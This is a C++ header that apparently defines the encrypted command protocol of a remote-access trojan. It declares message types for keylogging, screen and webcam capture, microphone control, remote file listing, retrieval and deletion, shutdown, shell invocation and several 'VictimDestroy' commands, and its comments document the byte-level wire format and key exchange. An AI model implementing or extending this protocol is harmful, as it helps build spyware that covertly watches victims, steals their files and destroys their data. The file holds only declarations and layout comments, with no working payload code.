#pragma once

#include <bits/stdc++.h>
#include "nlohmann/json.hpp"

using json = nlohmann::json;

enum MessageEnum {
    MessageRawText,
    MessageEnableScreenCap,
    MessageHeartbeatScreenCap,
    MessageDisableScreenCap,
    MessageEnableKeylog,
    MessageHeartbeartKeylog,
    MessageDisableKeylog,
    MessageEnableWebcam,
    MessageDisableWebcam,
    MessageEnableMicro,     //unimplemented
    MessageDisableMicro,    //unimplemented
    MessageListFile,
    MessageGetFile,
    MessageDeleteFile,
    MessageModifyFile,      //unimplemented
    MessageShutdownMachine,
    MessageInvokePowershell,//unimplemented
    MessageInvokeCmd,       //unimplemented
    MessageVictimDestroy1,  //unimplemented
    MessageVictimDestroy2,  
    MessageVictimDestroy3,  //unimplemented
};

class Message {
    public:
    uint16_t commandNumber;
    uint16_t returnCode = 1;
    uint16_t reserved = 0;

    ~Message();

    void setJsonData(const json& j);

    char* getJsonData() const;

    int getJsonDataSize() const;

    void setBinaryData(const char *tbuf, int tsize);

    char* getBinaryData() const;

    int getBinaryDataSize() const;

    int getSegmentSize() const;

    private:
    char magicNumber[4] = {'Z', 'Z', 'T', 'T'};
    int segmentSize = 16;   //default

    char *binaryData = nullptr;
    int binaryDataSize = 0;

    char *jsonData = nullptr;
    uint16_t jsonDataSize = 0;

    int setSegmentSize();
};

namespace JsonDataHelper {
    inline std::string GetFileName(const Message& msg) {
        std::string optionalData(msg.getJsonData(), msg.getJsonData()+msg.getJsonDataSize());
        std::string filename;
        json jsonData;
        try {
            jsonData = json::parse(optionalData);
            filename = jsonData.at("fileName");
        } catch(const json::parse_error& e) {
            std::cerr << "JSON error: " << e.what() << std::endl;
        }

        return filename;
    }
}

int assembleMessage(const char *bindata, int size, Message& msg, std::string *errorString = nullptr);

int prepareMessage(const Message& msg, char*& data, int& dataSize, std::string *errorString = nullptr);

int proceedEncryptedMessage(const char *bindata, int size, std::vector<uint8_t>& fullData, int& lastDataRemainingSize, std::array<uint8_t, 12>& nonce, std::string *errorString = nullptr);

/**
 * Message format decrypted:
 * 4 byte magic number: ZZTT
 * 4 byte: total segment size (only use 31bit, positive int)
 * 2 byte: command number
 * 2 byte: return code (for receiving), otherwise 0
 * 2 byte: json data size, including every character
 * 2 byte: unused
 * n byte: json data. Do not null-terminated
 * the rest: binary data
 */

 /**
 * Message format encrypted:
 * 4 byte magic number: ZZTE
 * 4 byte: encrypted data size (only positive int)
 * the rest: entire (Message format decrypted) encrypted data
 * 12 byte: the nonce
 * 4 byte: reserved (should be 0)
 */

 /**
  * Message format key exchange
  * 4 byte magic number: ZZTE
  * 4 byte of FF (=-1)
  * the rest: public key
  */

  /**
   * Idea: 
   * 1. Construct - export Message class to one big binary chunk
   * 2. Encrypt that whole big chunk to EncryptedMessage
   * 2.5. Encrypted message is the TCP "front-end": do the job of splitting the encrypted message
   */